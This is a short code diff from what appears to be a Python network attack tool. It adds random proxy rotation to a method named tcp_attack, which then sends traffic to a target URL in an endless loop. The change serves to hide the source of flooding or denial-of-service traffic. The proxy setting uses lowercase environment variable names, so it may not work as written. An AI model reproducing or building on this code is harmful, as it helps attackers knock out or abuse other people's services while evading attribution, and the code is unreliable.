@@ -178,6 +178,10 @@ class TCP:
     def tcp_attack(self,target_url,port_path,send_int,send_path):
 
             tcp = TCP(target_url)
+            
+            proxy = random.choice(self.proxy_list)
+            os.environ["http"] = f"http://{proxy}"
+            os.environ["https"] = f"https://{proxy}"
 
             while True:
                 sys.stdout.write("\r")
